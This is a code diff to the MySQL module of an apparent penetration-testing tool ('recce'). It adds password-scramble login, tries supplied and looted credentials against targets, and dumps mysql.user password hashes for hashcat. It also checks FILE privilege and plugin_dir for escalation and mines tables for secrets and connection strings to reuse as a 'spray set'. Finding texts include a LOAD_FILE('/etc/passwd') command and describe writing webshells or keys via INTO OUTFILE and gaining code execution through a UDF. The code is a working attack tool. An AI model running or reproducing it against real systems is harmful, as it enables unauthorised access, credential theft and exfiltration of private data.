@@ -10,6 +10,8 @@ Findings fold into the severity totals / Vulnerabilities sheet (source="mysql").
 """
 from __future__ import annotations
 
+import hashlib
+import re
 import socket
 import struct
 
@@ -69,15 +71,20 @@ def _server_version(payload: bytes) -> str:
 def _greeting(payload: bytes) -> dict:
     """Parse a MySQL/MariaDB server greeting (Handshake v10) for the capability flags
     and default auth plugin - read-only, no credentials. Returns {ssl, auth_plugin}."""
-    out = {"ssl": False, "auth_plugin": ""}
+    out = {"ssl": False, "auth_plugin": "", "salt": b""}
     try:
         if not payload or payload[0] != 10:
             return out
-        i = payload.find(b"\x00", 1)
-        if i < 0:
+        i0 = payload.find(b"\x00", 1)
+        if i0 < 0:
             return out
-        i += 1                                             # past version NUL
-        i += 4 + 8 + 1                                     # conn id + auth1 + filler
+        i0 += 1                                            # start of conn id
+        auth1 = payload[i0 + 4:i0 + 12]                    # auth-plugin-data part 1 (8B)
+        # part 2 sits after: conn(4)+auth1(8)+filler(1)+caplo(2)+charset(1)+status(2)
+        #                    +caphi(2)+authlen(1)+reserved(10) = 31 bytes from i0
+        auth2 = payload[i0 + 31:i0 + 31 + 12]              # part 2 (12B incl trailing NUL)
+        out["salt"] = (auth1 + auth2).rstrip(b"\x00")[:20]
+        i = i0 + 4 + 8 + 1                                 # conn id + auth1 + filler
         if i + 2 > len(payload):
             return out
         cap_lo = struct.unpack_from("<H", payload, i)[0]
@@ -106,6 +113,74 @@ def _handshake_response(user: str) -> bytes:
     body += b"\x00"                                        # auth-response length = 0 (empty)
     body += b"mysql_native_password\x00"                   # auth plugin name
     return body
+
+
+def _native_scramble(password: str, salt: bytes) -> bytes:
+    """mysql_native_password: SHA1(pw) XOR SHA1(salt + SHA1(SHA1(pw)))."""
+    if not password:
+        return b""
+    p1 = hashlib.sha1(password.encode()).digest()
+    p2 = hashlib.sha1(p1).digest()
+    p3 = hashlib.sha1(salt[:20] + p2).digest()
+    return bytes(a ^ b for a, b in zip(p1, p3))
+
+
+def _handshake_response_auth(user: str, password: str, salt: bytes) -> bytes:
+    """HandshakeResponse41 carrying a mysql_native_password scramble for `password`."""
+    token = _native_scramble(password, salt)
+    body = struct.pack("<IIB", _CAPS, _MAX_PKT, 0x21)
+    body += b"\x00" * 23
+    body += user.encode() + b"\x00"
+    body += bytes([len(token)]) + token
+    body += b"mysql_native_password\x00"
+    return body
+
+
+def _login(ip: str, port: int, user: str, password: str | None, timeout: float):
+    """Connect + authenticate (empty or native-password). Returns an authenticated
+    socket ready for _query, or None. `password` None/"" uses the empty-password path."""
+    try:
+        sock = socket.create_connection((ip, port), timeout=timeout)
+        sock.settimeout(timeout)
+    except OSError:
+        return None
+    try:
+        payload, seq = _read_packet(sock)
+        if not payload or payload[0] != 10:
+            sock.close()
+            return None
+        if password:
+            g = _greeting(payload)
+            resp = _handshake_response_auth(user, password, g.get("salt") or b"")
+        else:
+            resp = _handshake_response(user)
+        sock.sendall(struct.pack("<I", len(resp))[:3] + bytes([seq + 1]) + resp)
+        reply, _ = _read_packet(sock)
+        if not reply or reply[0] != 0x00:        # not an OK packet
+            sock.close()
+            return None
+        return sock
+    except OSError:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        return None
+
+
+def authenticate(ip: str, port: int, user: str, password: str,
+                 timeout: float = _TIMEOUT) -> bool:
+    """Try one credential (mysql_native_password). Returns True if it logs in."""
+    sock = _login(ip, port, user, password, timeout)
+    if sock is None:
+        return False
+    try:
+        return True
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
 
 
 def _login_empty(ip: str, port: int, user: str, timeout: float) -> dict:
@@ -228,24 +303,17 @@ def _query(sock: socket.socket, sql: str) -> list[list]:
     return rows
 
 
-def loot(ip: str, port: int, user: str = "root", timeout: float = _TIMEOUT) -> dict:
-    """Empty-password login confirmed -> pull read-only loot: user table (with the
-    authentication_string password HASHES) and the database list. SELECT only."""
-    out = {"users": [], "databases": [], "hashes": []}
-    try:
-        sock = socket.create_connection((ip, port), timeout=timeout)
-        sock.settimeout(timeout)
-    except OSError:
+def loot(ip: str, port: int, user: str = "root", timeout: float = _TIMEOUT,
+         password: str | None = None) -> dict:
+    """Authenticated (empty-password or credentialed) -> read-only loot: the user table
+    (password HASHES), the database list, and the connected account's FILE / privesc
+    capability (FILE grant, secure_file_priv, plugin_dir). SELECT only."""
+    out = {"users": [], "databases": [], "hashes": [], "current_user": "",
+           "file_priv": False, "secure_file_priv": None, "plugin_dir": "", "os": ""}
+    sock = _login(ip, port, user, password, timeout)
+    if sock is None:
         return out
     try:
-        payload, seq = _read_packet(sock)
-        if not payload or payload[0] != 10:
-            return out
-        resp = _handshake_response(user)
-        sock.sendall(struct.pack("<I", len(resp))[:3] + bytes([seq + 1]) + resp)
-        reply, _ = _read_packet(sock)
-        if not reply or reply[0] != 0x00:        # not authenticated
-            return out
         for r in _query(sock, "SELECT user, host, authentication_string, plugin "
                               "FROM mysql.user"):
             u, host, ash, plugin = (r + [None] * 4)[:4]
@@ -253,6 +321,18 @@ def loot(ip: str, port: int, user: str = "root", timeout: float = _TIMEOUT) -> d
             if ash:
                 out["hashes"].append({"user": u, "host": host, "hash": ash, "plugin": plugin})
         out["databases"] = [r[0] for r in _query(sock, "SHOW DATABASES")]
+        # Privesc surface: FILE grant + where files can be read/written + plugin dir (UDF).
+        srv = _query(sock, "SELECT CURRENT_USER(), @@secure_file_priv, @@plugin_dir, "
+                           "@@version_compile_os")
+        if srv and srv[0]:
+            row = (srv[0] + [None] * 4)[:4]
+            out["current_user"] = row[0] or ""
+            out["secure_file_priv"] = row[1]           # NULL=disabled, ''=anywhere, path=limited
+            out["plugin_dir"] = row[2] or ""
+            out["os"] = row[3] or ""
+        grants = _query(sock, "SHOW GRANTS")
+        blob = " ".join(g[0] for g in grants if g and g[0]).upper()
+        out["file_priv"] = ("FILE" in blob) or ("ALL PRIVILEGES" in blob and "*.*" in blob)
     except OSError:
         pass
     finally:
@@ -260,6 +340,58 @@ def loot(ip: str, port: int, user: str = "root", timeout: float = _TIMEOUT) -> d
             sock.close()
         except OSError:
             pass
+    return out
+
+
+def datamine(ip: str, port: int, dbs: list[str], timeout: float = _TIMEOUT,
+             user: str = "root", password: str | None = None,
+             max_dbs: int = 6, max_tables: int = 10, max_rows: int = 3) -> dict:
+    """Read-only secret hunting: sensitive columns across the accessible databases,
+    REDACTED row samples, and harvested connection strings. SELECT only."""
+    from .postgres import _CONNSTR, _SECRET_COL, _redact
+    out = {"secret_columns": [], "samples": [], "harvested": []}
+    sock = _login(ip, port, user, password, timeout)
+    if sock is None:
+        return out
+    try:
+        sysdb = ("information_schema", "performance_schema", "mysql", "sys")
+        rows = _query(
+            sock, "SELECT table_schema, table_name, column_name "
+            "FROM information_schema.columns "
+            "WHERE table_schema NOT IN ('information_schema','performance_schema',"
+            "'mysql','sys') ORDER BY 1,2")
+        secret_tables: dict = {}
+        for r in rows:
+            if len(r) < 3 or r[2] is None or r[0] in sysdb:
+                continue
+            sch, tbl, col = r[0], r[1], r[2]
+            if _SECRET_COL.search(col):
+                out["secret_columns"].append(
+                    {"db": sch, "table": f"{sch}.{tbl}", "column": col})
+                secret_tables.setdefault((sch, tbl), []).append(col)
+        for (sch, tbl), scols in list(secret_tables.items())[:max_tables]:
+            ident = f"`{sch}`.`{tbl}`".replace("\x00", "")
+            collist = ", ".join("`" + c.replace("`", "``") + "`" for c in scols[:6])
+            data = _query(sock, f"SELECT {collist} FROM {ident} LIMIT {max_rows}")
+            if not data:
+                continue
+            out["samples"].append({
+                "db": sch, "table": f"{sch}.{tbl}", "columns": scols[:6],
+                "rows": [[_redact(v) for v in row] for row in data]})
+            for row in data:
+                for v in row:
+                    for m in _CONNSTR.finditer(str(v or "")):
+                        out["harvested"].append(m.group(0))
+    except OSError:
+        pass
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+    seen: set = set()
+    out["harvested"] = [c for c in out["harvested"]
+                        if not (c in seen or seen.add(c))]
     return out
 
 
@@ -315,6 +447,73 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Set a strong password on every account (esp. root); remove anonymous "
                     "''@'%' accounts; bind to localhost / a private interface.",
                     ["CWE-521", "CWE-306"], kind="mysql_empty_password"))
+            elif pr.get("cred_access"):
+                who = pr.get("cred_user", "?")
+                ver = pr.get("version") or ""
+                out.append(_finding(
+                    "high", "MySQL credentialed access (looted / weak credential)", tgt,
+                    f"recce logged in as '{who}' with a credential from the engagement"
+                    + (f" (server {ver})" if ver else "")
+                    + ". The account has database access.",
+                    f"mysql -h {h.ip} -P {p.portid} -u {who} -p",
+                    "Rotate the credential; enforce least privilege; bind to a trusted "
+                    "interface.",
+                    ["CWE-522", "CWE-284"], kind="mysql_cred_access"))
+            # FILE privilege -> arbitrary file read/write, and (with a writable plugin
+            # dir) UDF OS command execution as the mysql service account.
+            lt = pr.get("loot") or {}
+            if lt.get("file_priv"):
+                who = pr.get("cred_user") or pr.get("user") or "root"
+                sfp = lt.get("secure_file_priv")
+                sfp_txt = ("secure_file_priv is EMPTY (read/write anywhere)"
+                           if sfp == "" else
+                           (f"secure_file_priv={sfp}" if sfp else
+                            "secure_file_priv is NULL (file ops disabled)"))
+                udf = ""
+                if lt.get("plugin_dir"):
+                    udf += f" plugin_dir={lt['plugin_dir']}"
+                out.append(_finding(
+                    "high", "MySQL FILE privilege (arbitrary file read/write -> RCE)", tgt,
+                    f"The account '{lt.get('current_user') or who}' holds the FILE "
+                    f"privilege - {sfp_txt}." + udf
+                    + " LOAD_FILE() reads any file the mysql user can (/etc/passwd, "
+                    "app configs, private keys); SELECT ... INTO OUTFILE writes a "
+                    "webshell / cron / authorized_keys; a UDF dropped into a writable "
+                    "plugin_dir gives OS command execution as the service account.",
+                    f"mysql -h {h.ip} -P {p.portid} -u {who} -e "
+                    "\"SELECT LOAD_FILE('/etc/passwd')\"   # then INTO OUTFILE / UDF (ROE)",
+                    "Revoke FILE from application accounts; set secure_file_priv to a "
+                    "dedicated dir (or NULL); run mysqld as an unprivileged user.",
+                    ["CWE-732", "CWE-250"], kind="mysql_file_priv"))
+            # Exfil: sensitive columns + redacted samples + harvested connection strings.
+            dm = pr.get("datamine")
+            if dm and dm.get("secret_columns"):
+                cols = dm["secret_columns"]
+                tables = sorted({c["table"] for c in cols})
+                detail = (f"recce mined {len(cols)} sensitive column(s) across "
+                          f"{len(tables)} table(s): "
+                          + ", ".join(f"{c['table']}.{c['column']}" for c in cols[:12])
+                          + (" …" if len(cols) > 12 else "") + ".")
+                samples = dm.get("samples") or []
+                if samples:
+                    s = samples[0]
+                    detail += ("\n\nSAMPLE (redacted) " + s["table"] + " ["
+                               + ", ".join(s["columns"]) + "]: "
+                               + " | ".join(", ".join(row) for row in s["rows"][:2]))
+                harvested = dm.get("harvested") or []
+                if harvested:
+                    detail += (f"\n\nHARVESTED {len(harvested)} connection string(s) -> "
+                               "spray set: "
+                               + ", ".join(re.sub(r":[^:@/]+@", ":****@", c)
+                                           for c in harvested[:5]))
+                out.append(_finding(
+                    "high", "MySQL sensitive data exposed (PII / secrets / credentials)",
+                    tgt, detail,
+                    f"mysql -h {h.ip} -P {p.portid} -u <u> -p -e "
+                    "\"SELECT * FROM <db>.<table> LIMIT 20\"   # full data (ROE)",
+                    "Encrypt sensitive columns; least-privilege the app account; remove "
+                    "embedded credentials; restrict network access.",
+                    ["CWE-200", "CWE-312"], kind="mysql_datamine"))
             # TLS not offered by the server -> credentials + queries cross the wire in
             # cleartext (sniffable / MITM). Only assert it when we actually parsed a
             # greeting (reachable), never as a guess.
@@ -351,6 +550,7 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
     looted: list = []
     if active:
         from .models import Credential
+        from .postgres import _cred_list
         for t, pr in svcprobe.iter_probe(
                 targets, lambda t: probe(t["ip"], t["port"]),
                 budget=budget, progress=progress, state=state):
@@ -359,14 +559,36 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 t["unauth"] = pr.get("unauth", False)
                 t["auth_required"] = pr.get("auth_required", False)
                 t["version"] = pr.get("version", "") or t.get("version", "")
+                acc_user, acc_pw, note = None, None, ""
                 if pr.get("unauth"):
-                    pr["loot"] = loot(t["ip"], t["port"], user=pr.get("user") or "root")
-                    for hh in pr["loot"].get("hashes", []):
+                    acc_user, acc_pw = pr.get("user") or "root", None
+                    note = "empty-password"
+                elif pr.get("auth_required"):
+                    # Credentialed follow-through: try supplied/looted credentials.
+                    for u, pw in _cred_list(creds):
+                        if authenticate(t["ip"], t["port"], u, pw):
+                            pr["cred_access"] = True
+                            pr["cred_user"] = u
+                            t["cred_access"] = True
+                            acc_user, acc_pw, note = u, pw, f"credentialed ({u})"
+                            break
+                if acc_user is not None:
+                    lt = loot(t["ip"], t["port"], user=acc_user, password=acc_pw)
+                    pr["loot"] = lt
+                    for hh in lt.get("hashes", []):
                         looted.append(Credential(
                             username=hh["user"] or "", secret=hh["hash"],
                             kind="hash", source="mysql-loot", origin_ip=t["ip"],
-                            notes=f"mysql.user hash ({hh.get('plugin')}) from empty-password "
+                            notes=f"mysql.user hash ({hh.get('plugin')}) from {note} "
                                   f"MySQL :{t['port']} - hashcat -m 300"))
+                    dm = datamine(t["ip"], t["port"], lt.get("databases", []),
+                                  user=acc_user, password=acc_pw)
+                    pr["datamine"] = dm
+                    for cs in dm.get("harvested", []):
+                        looted.append(Credential(
+                            username="(embedded)", secret=cs, kind="password",
+                            source="mysql-datamine", origin_ip=t["ip"],
+                            notes=f"connection string mined from MySQL :{t['port']}"))
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
